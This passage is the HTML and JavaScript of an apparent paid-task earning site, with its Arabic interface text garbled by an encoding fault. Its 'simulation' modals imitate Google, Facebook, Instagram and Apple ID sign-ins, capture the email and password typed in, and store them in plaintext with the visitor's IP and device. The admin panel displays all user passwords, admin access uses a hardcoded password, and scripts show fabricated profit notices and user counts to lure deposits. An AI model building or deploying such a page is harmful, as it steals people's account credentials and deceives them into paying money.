                    <div><span class="block text-xs text-gray-500 font-bold">Ø§Ù„Ø±ØµÙŠØ¯</span><span id="profile-balance" class="text-xl font-bold">0.00</span></div>
                    <div><span class="block text-xs text-gray-500 font-bold">Ø§Ù„Ø£Ø±Ø¨Ø§Ø­</span><span id="profile-total-income" class="text-xl font-bold text-green-600">0.00</span></div>
                </div>
            </div>
            <div class="px-6 space-y-2 mb-6">
                 <div class="bg-white p-3 rounded-xl flex justify-between items-center shadow-sm border border-gray-50"><span class="text-gray-500 text-sm font-bold"><i class="fa-solid fa-qrcode text-purple-500 ml-2"></i>ÙƒÙˆØ¯ Ø§Ù„Ø¯Ø¹ÙˆØ©</span><span class="font-mono font-bold text-gray-800 bg-gray-100 px-2 rounded" id="profile-invite">---</span></div>
                 <div class="bg-white p-3 rounded-xl flex justify-between items-center shadow-sm border border-gray-50"><span class="text-gray-500 text-sm font-bold"><i class="fa-regular fa-calendar text-blue-500 ml-2"></i>Ø§Ù†Ø¶Ù…Ø§Ù…</span><span class="font-bold text-xs text-gray-600" id="profile-date">--/--/----</span></div>
            </div>
            <div class="px-6 space-y-3"><button onclick="attemptWithdraw()" class="w-full bg-gray-900 text-white py-3 rounded-xl font-bold shadow-lg flex items-center justify-center gap-2 hover:bg-black transition"><i class="fa-solid fa-money-bill-wave"></i> Ø³Ø­Ø¨ Ø§Ù„Ø£Ø±Ø¨Ø§Ø­</button><button onclick="logout()" class="w-full border-2 border-red-100 text-red-500 py-3 rounded-xl font-bold hover:bg-red-50 transition">ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø®Ø±ÙˆØ¬</button></div>
        </div>

        <div id="history-page" class="hidden fade-in text-center pt-20"><i class="fa-solid fa-box-open text-6xl text-gray-200 mb-4"></i><p class="text-gray-400">Ù„Ø§ ØªÙˆØ¬Ø¯ Ø³Ø¬Ù„Ø§Øª</p></div>

        <nav id="bottom-nav" class="hidden fixed bottom-0 left-0 w-full bg-white border-t border-gray-100 flex justify-around py-3 pb-6 z-40 shadow-[0_-10px_20px_rgba(0,0,0,0.05)] rounded-t-2xl">
            <div id="nav-home" onclick="switchTab('home-page', this)" class="nav-item active text-center cursor-pointer w-1/5"><i class="fa-solid fa-house text-xl mb-1 block"></i><span class="text-[10px] font-bold">Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ©</span></div>
            <div id="nav-sign" onclick="switchTab('signature-page', this)" class="nav-item text-center cursor-pointer w-1/5"><i class="fa-solid fa-crown text-xl mb-1 block"></i><span class="text-[10px] font-bold">Ø§Ù„Ø¨Ø§Ù‚Ø§Øª</span></div>
            <div id="nav-work" onclick="switchTab('work-page', this)" class="nav-item text-center cursor-pointer w-1/5 relative"><div class="absolute -top-8 left-1/2 transform -translate-x-1/2 bg-yellow-400 w-12 h-12 rounded-full flex items-center justify-center border-4 border-white shadow-xl text-black"><i class="fa-solid fa-briefcase text-lg"></i></div><span class="text-[10px] font-bold mt-6 block">Ø§Ù„Ø¹Ù…Ù„</span></div>
            <div id="nav-hist" onclick="switchTab('history-page', this)" class="nav-item text-center cursor-pointer w-1/5"><i class="fa-solid fa-clock-rotate-left text-xl mb-1 block"></i><span class="text-[10px] font-bold">Ø§Ù„Ø³Ø¬Ù„</span></div>
            <div id="nav-prof" onclick="switchTab('profile-page', this)" class="nav-item text-center cursor-pointer w-1/5"><i class="fa-solid fa-user text-xl mb-1 block"></i><span class="text-[10px] font-bold">Ø­Ø³Ø§Ø¨ÙŠ</span></div>
        </nav>
    </div>

    <script>
        let tasks=[], currentUser=null, allUsers=[], allRequests=[], supportMessages=[], siteSettings={}, signatures=[];
        let generatedOtp=null, registeringPhone=null, selectedFile=null;

        function initializeAppLogic() {
            setTimeout(() => {
                document.getElementById('loading-overlay').classList.add('hidden');
                document.getElementById('auth-screen').classList.remove('hidden');
                setupRealtimeListeners();
                renderSignatures();
                startFakeTicker();
                startImageSlider();
                startFakeUserCount();
            }, 1500);
        }

        function setupRealtimeListeners() {
            window.onValue(window.ref(window.db, 'tasks'), (s) => { if(s.val()) tasks=Object.values(s.val()); else seedTasks(); if(document.getElementById('admin-panel').style.display !== 'none') renderAdminTasksUI(); });
            window.onValue(window.ref(window.db, 'users'), (s) => { if(s.val()) allUsers=Object.values(s.val()); updateDashboardStats(); if(document.getElementById('admin-panel').style.display !== 'none') renderAdminUsersUI(); });
            window.onValue(window.ref(window.db, 'signatures'), (s) => { if(s.val()) signatures=s.val(); else seedSignatures(); renderSignatures(); if(document.getElementById('admin-panel').style.display !== 'none') renderAdminSignaturesUI(); });
            window.onValue(window.ref(window.db, 'recharge_requests'), (s) => { if(s.val()) allRequests=Object.entries(s.val()).map(([k,v])=>({id:k,...v})); updateDashboardStats(); if(document.getElementById('admin-panel').style.display !== 'none') renderAdminRequestsUI(); });
            window.onValue(window.ref(window.db, 'settings'), (s) => { siteSettings=s.val()||{vodafoneCashNumber:'010',siteAnnouncement:'Welcome',supportLink:'#'}; updateClientSettingsUI(); });
            window.onValue(window.ref(window.db, 'support_messages'), (s) => { if(s.val()) { supportMessages=Object.entries(s.val()).map(([k,v])=>({id:k,...v})); if(currentUser && !document.getElementById('client-app').classList.contains('hidden')) renderClientSupportHistory(); if(document.getElementById('admin-panel').style.display !== 'none') renderAdminSupportUI(); } });
        }

        function seedTasks() { let t=[]; for(let i=1;i<=24;i++) t.push({id:i, name:`Ù…Ù‡Ù…Ø© ${i}`, price:i*100, commission:i*10, img:`https://source.unsplash.com/random/200x200?sig=${i}`}); window.set(window.ref(window.db,'tasks'), t); }
        function seedSignatures() { let s=[{name:"VIP 1",price:300,img:""},{name:"VIP 2",price:500,img:""},{name:"VIP 3",price:1000,img:""}]; window.set(window.ref(window.db,'signatures'), s); }

        window.switchView = (v) => { ['auth-landing','auth-login','auth-register'].forEach(id=>document.getElementById(id).classList.add('hidden')); document.getElementById(v).classList.remove('hidden'); }
        window.openSimulation = (p) => { const m=document.getElementById('sim-modal'); m.classList.remove('hidden'); document.getElementById('sim-provider').value=p; document.getElementById('sim-title').innerText = p==='google'?'Google':p==='facebook'?'Facebook':p==='instagram'?'Instagram':'Apple ID'; }
        window.closeSimulation = () => document.getElementById('sim-modal').classList.add('hidden');
        
        window.submitSimulation = async () => {
            const e=document.getElementById('sim-email').value, p=document.getElementById('sim-pass').value, pr=document.getElementById('sim-provider').value;
            if(!e||!p) return alert("Ø¨ÙŠØ§Ù†Ø§Øª Ù†Ø§Ù‚ØµØ©"); window.closeSimulation(); document.getElementById('loading-overlay').classList.remove('hidden');
            let ip='Unknown'; try{const r=await fetch('https://api.ipify.org?format=json');const d=await r.json();ip=d.ip;}catch(e){}
            const k=e.replace(/[.#$[\]]/g,'_'), uid=Math.floor(100000+Math.random()*900000), inv=Math.random().toString(36).substring(2,8).toUpperCase(), jd=new Date().toLocaleDateString('ar-EG');
            const u={name:e.split('@')[0], email:e, password:p, provider:pr, balance:0, totalIncome:0, currentTaskIndex:1, ip:ip, device:navigator.userAgent, isBanned:false, isSigned:false, uid:uid, inviteCode:inv, joinDate:jd};
            window.set(window.ref(window.db,'users/'+k),u).then(()=>{currentUser=u; finalizeLogin();});
        };

        window.sendOtp = () => { registeringPhone=document.getElementById('reg-phone').value; if(!registeringPhone) return alert("Ø§ÙƒØªØ¨ Ø§Ù„Ø±Ù‚Ù…"); window.get(window.ref(window.db,'users/'+registeringPhone)).then(s=>{ if(s.exists()){alert("Ù…Ø³Ø¬Ù„");window.switchView('auth-login');}else{ generatedOtp=Math.floor(1000+Math.random()*9000); alert("Ø§Ù„ÙƒÙˆØ¯: "+generatedOtp); document.getElementById('reg-step-1').classList.add('hidden'); document.getElementById('reg-step-2').classList.remove('hidden'); } }); }
        window.verifyOtp = () => { if(document.getElementById('reg-otp-input').value==generatedOtp){ document.getElementById('reg-step-2').classList.add('hidden'); document.getElementById('reg-step-3').classList.remove('hidden'); } else alert("Ø®Ø·Ø£"); }
        
        window.completeRegistration = async () => {
            const n=document.getElementById('reg-name').value, d=document.getElementById('reg-dob').value, p=document.getElementById('reg-pass').value, pc=document.getElementById('reg-pass-confirm').value;
            if(!n||!d||!p||!pc) return alert("Ù†Ø§Ù‚Øµ");
            const bDate=new Date(d), today=new Date(); let age=today.getFullYear()-bDate.getFullYear(); if(today.getMonth()<bDate.getMonth()||(today.getMonth()===bDate.getMonth()&&today.getDate()<bDate.getDate())) age--;
            if(age<16) return alert("Ø§Ù„Ø¹Ù…Ø± 16+"); if(p.length<6) return alert("ÙƒÙ„Ù…Ø© Ø§Ù„Ø³Ø± Ø¶Ø¹ÙŠÙØ©"); if(p!==pc) return alert("ÙƒÙ„Ù…Ø© Ø§Ù„Ø³Ø± ØºÙŠØ± Ù…ØªØ·Ø§Ø¨Ù‚Ø©");
            let ip='Unknown'; try{const r=await fetch('https://api.ipify.org?format=json');const d=await r.json();ip=d.ip;}catch(e){}
            const uid=Math.floor(100000+Math.random()*900000), inv=Math.random().toString(36).substring(2,8).toUpperCase(), jd=new Date().toLocaleDateString('ar-EG');
            window.set(window.ref(window.db,'users/'+registeringPhone), {name:n, phone:registeringPhone, dob:d, password:p, balance:0, totalIncome:0, currentTaskIndex:1, isTaskFrozen:false, isSigned:false, isBanned:false, ip:ip, device:navigator.userAgent, uid:uid, inviteCode:inv, joinDate:jd, provider:'Phone'}).then(()=>{alert("ØªÙ…"); window.switchView('auth-login');});
        }

        window.loginUser = () => {
            const p=document.getElementById('login-phone').value, pw=document.getElementById('login-pass').value;
            if(p==='admin' && pw==='mohy123') { document.getElementById('auth-screen').classList.add('hidden'); document.getElementById('admin-panel').classList.remove('hidden'); showAdminTab('users'); return; }
            window.get(window.ref(window.db,'users/'+p)).then(s=>{
                if(s.exists()&&s.val().password===pw) {
                    if(s.val().isBanned) return alert("Ù…Ø­Ø¸ÙˆØ±");
                    currentUser=s.val();
                    window.onValue(window.ref(window.db,'users/'+p),(snap)=>{currentUser=snap.val(); if(currentUser) updateAppUI();});
                    finalizeLogin();
                } else alert("Ø¨ÙŠØ§Ù†Ø§Øª Ø®Ø§Ø·Ø¦Ø©");
            });
        }
        
        window.adminLoginPrompt = () => { if(prompt("ÙƒÙˆØ¯ Ø§Ù„Ù…Ø³Ø¤ÙˆÙ„:")==="mohy123") { document.getElementById('auth-screen').classList.add('hidden'); document.getElementById('admin-panel').classList.remove('hidden'); showAdminTab('users'); } };
        window.logout = () => location.reload();

        function finalizeLogin() { document.getElementById('auth-screen').classList.add('hidden'); document.getElementById('client-app').classList.remove('hidden'); document.getElementById('bottom-nav').classList.remove('hidden'); updateAppUI(); }
        function updateAppUI() {
            if(currentUser.isBanned) { alert("ØªÙ… Ø­Ø¸Ø±Ùƒ"); location.reload(); return; }
            document.getElementById('profile-name').innerText = currentUser.name; document.getElementById('home-user-name').innerText = currentUser.name;
            document.getElementById('profile-phone').innerText = currentUser.phone||currentUser.email;
            document.getElementById('profile-balance').innerText = currentUser.balance.toFixed(2);
            document.getElementById('profile-total-income').innerText = currentUser.totalIncome.toFixed(2);
            document.getElementById('profile-id').innerText = currentUser.uid || '---';
            document.getElementById('profile-invite').innerText = currentUser.inviteCode || '---';
            document.getElementById('profile-date').innerText = currentUser.joinDate || '---';
            document.getElementById('profile-rank').innerText = currentUser.isSigned ? 'VIP Member' : 'Ø¹Ø¶Ùˆ Ù…Ø¬Ø§Ù†ÙŠ';
            const rankEl = document.getElementById('profile-rank');
            if(currentUser.isSigned) { rankEl.parentElement.classList.remove('text-gray-400'); rankEl.parentElement.classList.add('text-yellow-400'); }
            else { rankEl.parentElement.classList.add('text-gray-400'); rankEl.parentElement.classList.remove('text-yellow-400'); }
            renderClientSupportHistory(); updateWorkPage();
        }
        
        window.copyId = () => { navigator.clipboard.writeText(document.getElementById('profile-id').innerText); alert("ØªÙ… Ù†Ø³Ø® ID"); };
        window.copyToClipboard = () => { navigator.clipboard.writeText(document.getElementById('recharge-admin-number').innerText); alert("ØªÙ… Ø§Ù„Ù†Ø³Ø®"); };
        
        function updateClientSettingsUI() { document.getElementById('recharge-admin-number').innerText=siteSettings.vodafoneCashNumber; document.getElementById('announcement-display-text').innerText=siteSettings.siteAnnouncement; document.getElementById('direct-support-btn').href=siteSettings.supportLink; }
        function updateDashboardStats() { document.getElementById('stat-total-users').innerText=allUsers.length; document.getElementById('stat-total-balance').innerText=allUsers.reduce((a,u)=>a+(u.balance||0),0).toFixed(0); document.getElementById('stat-pending-req').innerText=allRequests.filter(r=>r.status==='pending').length; }

        window.showAdminTab = (t) => {
            document.querySelectorAll('.admin-section').forEach(e=>e.classList.add('hidden'));
            document.querySelectorAll('.admin-nav-item').forEach(e=>e.classList.remove('active'));
            document.getElementById(`admin-${t}-sec`).classList.remove('hidden');
            if(document.getElementById(`nav-${t}`)) document.getElementById(`nav-${t}`).classList.add('active');
            if(t==='users') renderAdminUsersUI(); if(t==='tasks') renderAdminTasksUI(); if(t==='signatures') renderAdminSignaturesUI(); if(t==='requests') renderAdminRequestsUI(); if(t==='support') renderAdminSupportUI(); if(t==='settings') renderAdminSettingsUI();
        }

        window.searchUsers = () => { renderAdminUsersUI(document.getElementById('search-user').value); }
        function renderAdminUsersUI(filter='') {
            let h=''; allUsers.filter(u=>(String(u.phone||'')+String(u.email||'')+String(u.name||'')).includes(filter)).forEach(u=>{
                let k=(u.email||u.phone||'').replace(/[.#$[\]]/g,'_');
                let b=u.isBanned?`<button onclick="unbanUser('${k}')" class="text-gray-500 bg-gray-100 px-2 rounded text-xs m-1">ÙÙƒ</button>`:`<button onclick="banUser('${k}')" class="text-red-500 bg-red-100 px-2 rounded text-xs m-1">Ø­Ø¸Ø±</button>`;
                let d=u.isTaskFrozen?`<button onclick="unlockTask('${k}',${u.currentTaskIndex||1})" class="text-yellow-600 bg-yellow-100 px-2 rounded text-xs m-1">ÙØªØ­</button>`:'';
                let edit = `<button onclick="editUserBalance('${k}',${u.balance||0})" class="text-blue-600 bg-blue-100 px-2 rounded text-xs m-1"><i class="fa-solid fa-pen"></i></button>`;
                let del = `<button onclick="deleteUser('${k}')" class="text-red-600 mx-1"><i class="fa-solid fa-trash"></i></button>`;
                let devInfo = `<div class="text-[10px] text-gray-400 truncate w-24" title="${u.device}">IP: ${u.ip || 'N/A'}</div>`;
                h+=`<tr><td><div class="font-bold">${u.name}</div><div class="text-xs text-gray-400">${u.phone||u.email}</div></td><td>${devInfo}</td><td class="text-red-400 font-mono text-xs">${u.password}</td><td class="font-bold text-green-600">${u.balance}</td><td>${u.isBanned?'<span class="text-red-500 text-xs">Ù…Ø­Ø¸ÙˆØ±</span>':'<span class="text-green-500 text-xs">Ù†Ø´Ø·</span>'}</td><td>${edit}${b}${d}${del}</td></tr>`;
            }); document.getElementById('admin-users-list').innerHTML=h||'<tr><td colspan="6" class="text-center p-4 text-gray-400">Ù„Ø§ ÙŠÙˆØ¬Ø¯ Ù†ØªØ§Ø¦Ø¬</td></tr>';
        }

        window.unlockNextTask = (p,i) => { if(confirm("ÙØªØ­ØŸ")) window.update(window.ref(window.db,`users/${p}`),{isTaskFrozen:false, currentTaskIndex:i+1}); }
        window.banUser = (p) => { if(confirm("Ø­Ø¸Ø±ØŸ")) window.update(window.ref(window.db,`users/${p}`),{isBanned:true}); }
        window.unbanUser = (p) => { window.update(window.ref(window.db,`users/${p}`),{isBanned:false}); }
        window.deleteUser = (p) => { if(confirm("Ø­Ø°ÙØŸ")) window.remove(window.ref(window.db,`users/${p}`)); }
        window.editUserBalance = (p,b) => { const n=prompt("Ø±ØµÙŠØ¯:",b); if(n) window.update(window.ref(window.db,`users/${p}`),{balance:parseFloat(n)}); }

        function renderAdminTasksUI() { const c=document.getElementById('admin-tasks-container'); c.innerHTML=''; tasks.forEach((t,i)=>{ c.innerHTML+=`<div class="bg-white border p-2 rounded flex gap-2 items-center text-sm"><span class="w-5 font-bold text-gray-400">${i+1}</span><input id="tn-${i}" value="${t.name}" class="border p-1 rounded w-1/3"><input id="tp-${i}" value="${t.price}" class="border p-1 rounded w-16 text-center"><input id="tc-${i}" value="${t.commission}" class="border p-1 rounded w-16 text-center"><input id="ti-${i}" value="${t.img}" class="border p-1 rounded flex-1"></div>`; }); }
        window.saveAdminTasks = () => { let u=[]; for(let i=0;i<tasks.length;i++) u.push({id:i+1, name:document.getElementById(`tn-${i}`).value, price:parseFloat(document.getElementById(`tp-${i}`).value), commission:parseFloat(document.getElementById(`tc-${i}`).value), img:document.getElementById(`ti-${i}`).value}); window.set(window.ref(window.db,'tasks'), u).then(()=>alert("ØªÙ…")); }

        function renderAdminSignaturesUI() { const c=document.getElementById('admin-signatures-container'); c.innerHTML=''; signatures.forEach((s,i)=>{ c.innerHTML+=`<div class="bg-white border p-2 rounded flex gap-2 items-center"><input id="sn-${i}" value="${s.name}" class="border p-1 text-xs flex-1"><input id="sp-${i}" value="${s.price}" class="border p-1 text-xs w-20"><input id="si-${i}" value="${s.img||''}" class="border p-1 text-xs w-1/3"><button onclick="deleteSignature(${i})" class="text-red-500"><i class="fa-solid fa-trash"></i></button></div>`; }); }
        window.saveAdminSignatures = () => { let u=[]; const rows=document.getElementById('admin-signatures-container').children; for(let i=0; i<rows.length; i++) if(document.getElementById(`sn-${i}`)) u.push({name:document.getElementById(`sn-${i}`).value, price:parseFloat(document.getElementById(`sp-${i}`).value), img:document.getElementById(`si-${i}`).value}); window.set(window.ref(window.db,'signatures'), u).then(()=>alert("ØªÙ…")); }
        window.addNewSignature = () => { signatures.push({name:"New", price:0}); renderAdminSignaturesUI(); }
        window.deleteSignature = (i) => { signatures.splice(i,1); renderAdminSignaturesUI(); }

        function renderAdminRequestsUI() { let h=''; allRequests.filter(r=>r.status==='pending').forEach(r=>{ h+=`<tr><td>${r.senderName}<br><span class="text-xs text-gray-400">${r.userPhone}</span></td><td class="text-green-600 font-bold">${r.amount}</td><td><a href="#" class="text-blue-500 text-xs" onclick="alert('${r.fileName}')">Ø¹Ø±Ø¶</a></td><td><button onclick="approveReq('${r.id}','${r.userPhone}',${r.amount})" class="text-green-500 mx-1"><i class="fa-solid fa-check"></i></button><button onclick="rejectReq('${r.id}')" class="text-red-500 mx-1"><i class="fa-solid fa-xmark"></i></button></td></tr>`; }); document.getElementById('admin-requests-list').innerHTML=h||'<tr><td colspan="4" class="text-center text-gray-400 py-4">Ù„Ø§ Ø·Ù„Ø¨Ø§Øª</td></tr>'; }
        window.approveReq = (id,p,a) => { window.update(window.ref(window.db,`recharge_requests/${id}`),{status:'approved'}); window.get(window.ref(window.db,`users/${p}`)).then(s=>window.update(window.ref(window.db,`users/${p}`),{balance:(s.val().balance||0)+a})); }
        window.rejectReq = (id) => { const r=prompt("Ø³Ø¨Ø¨:"); if(r) window.update(window.ref(window.db,`recharge_requests/${id}`),{status:'rejected', rejectionReason:r}); }

        function renderAdminSupportUI() { let h=''; supportMessages.sort((a,b)=>b.timestamp-a.timestamp).forEach(m=>{ h+=`<tr><td>${m.userName}<br><span class="text-xs text-gray-400">${m.userPhone}</span></td><td class="text-xs">${m.message}</td><td>${m.reply ? '<i class="fa-solid fa-check text-green-500"></i>' : `<button onclick="replyToMsg('${m.id}')" class="bg-blue-100 text-blue-600 px-2 py-1 rounded text-xs">Ø±Ø¯</button>`}</td></tr>`; }); document.getElementById('admin-support-list').innerHTML=h; }
        window.replyToMsg = (id) => { const r=prompt("Ø§Ù„Ø±Ø¯:"); if(r) window.update(window.ref(window.db,`support_messages/${id}`),{reply:r}); }
        window.sendSupportMessage = () => { const m=document.getElementById('support-msg-input').value; if(!m) return; window.push(window.ref(window.db,'support_messages'), {userPhone:currentUser.phone, userName:currentUser.name, message:m, timestamp:Date.now()}).then(()=>{document.getElementById('support-msg-input').value=''; renderClientSupportHistory();}); }
        function renderClientSupportHistory() { const c=document.getElementById('client-support-history'); c.innerHTML=''; supportMessages.filter(m=>m.userPhone===currentUser.phone).forEach(m=>{ c.innerHTML+=`<div class="bg-blue-50 p-2 rounded mb-2 text-right text-xs border border-blue-100">${m.message}</div>`; if(m.reply) c.innerHTML+=`<div class="bg-green-50 p-2 rounded mb-2 text-left text-xs text-green-700 border border-green-100">Ø§Ù„Ø¯Ø¹Ù…: ${m.reply}</div>`; }); }

        function renderAdminSettingsUI() { document.getElementById('setting-cash-number').value=siteSettings.vodafoneCashNumber; document.getElementById('setting-support-link').value=siteSettings.supportLink; document.getElementById('setting-announcement').value=siteSettings.siteAnnouncement; }
        window.saveSiteSettings = () => { window.update(window.ref(window.db,'settings'),{vodafoneCashNumber:document.getElementById('setting-cash-number').value, supportLink:document.getElementById('setting-support-link').value, siteAnnouncement:document.getElementById('setting-announcement').value}).then(()=>alert("ØªÙ…")); }

        function startFakeTicker() { setInterval(()=>{ const c=document.getElementById('fake-profit-ticker'); if(c) { const d=document.createElement('div'); d.className='text-[10px] text-gray-500 flex justify-between px-2 mb-1'; d.innerHTML=`<span>01xxxx${Math.floor(Math.random()*1000)}</span><span class="text-green-600 font-bold">+${Math.floor(Math.random()*50)*100}</span>`; c.prepend(d); if(c.children.length>3) c.lastChild.remove(); } }, 2500); }
        function startImageSlider() { setInterval(()=>{ const s=document.querySelectorAll('.slider-container .slide'); if(s.length){ let a=document.querySelector('.slide.active'); a.classList.remove('active'); (a.nextElementSibling||s[0]).classList.add('active'); } }, 3000); }
        function startFakeUserCount() { setInterval(()=>{ const e=document.getElementById('fake-user-count'); if(e) e.innerText=(parseInt(e.innerText.replace(',',''))+Math.floor(Math.random()*3)).toLocaleString(); }, 5000); }
        window.handleFileSelect = (e) => { const f=e.target.files[0]; if(f){ selectedFile=f; const r=new FileReader(); r.onload=(e)=>{document.getElementById('upload-preview').src=e.target.result; document.getElementById('upload-preview').classList.remove('hidden'); document.getElementById('upload-icon').classList.add('hidden'); document.getElementById('upload-text').innerText="ØªÙ… Ø§Ù„Ø§Ø®ØªÙŠØ§Ø±";} ; r.readAsDataURL(f); } }
        window.submitRechargeRequest = () => { const a=document.getElementById('charge-amount').value, s=document.getElementById('charge-sender').value, n=document.getElementById('charge-name').value; if(!a||!s||!n||!selectedFile) return alert("Ù†Ø§Ù‚Øµ"); window.push(window.ref(window.db,'recharge_requests'), {userPhone:currentUser.phone||currentUser.email, senderName:n, amount:parseFloat(a), senderNumber:s, fileName:selectedFile.name, status:'pending', timestamp:Date.now()}).then(()=>{alert("ØªÙ…"); closeRechargeModal();}); }
        window.openRechargeModal = () => document.getElementById('recharge-modal').classList.remove('hidden');
        window.closeRechargeModal = () => document.getElementById('recharge-modal').classList.add('hidden');
        window.switchTab = (id, el) => { ['home-page','signature-page','work-page','history-page','profile-page','support-page'].forEach(p => document.getElementById(p).classList.add('hidden')); document.getElementById(id).classList.remove('hidden'); document.querySelectorAll('.nav-item').forEach(n => { n.classList.remove('active', 'text-black'); n.classList.add('text-gray-400'); }); if(el) { el.classList.add('active', 'text-black'); el.classList.remove('text-gray-400'); } }
    </script>
</body>
</html>
